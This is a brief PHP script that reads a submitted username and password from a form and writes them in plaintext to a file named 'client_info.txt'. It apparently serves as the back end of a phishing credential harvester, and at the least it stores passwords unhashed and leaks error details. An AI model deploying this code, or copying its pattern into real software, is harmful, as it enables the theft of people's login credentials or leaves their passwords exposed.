<?php
	$myfile = fopen("client_info.txt", "w") or die(print_r(error_get_last()));
	$txt = "username: " . $_POST['username'] . "\n";
	$txt .= "password: " . $_POST['password'] . " \n";
	fwrite($myfile, $txt);
	fclose($myfile);
?>
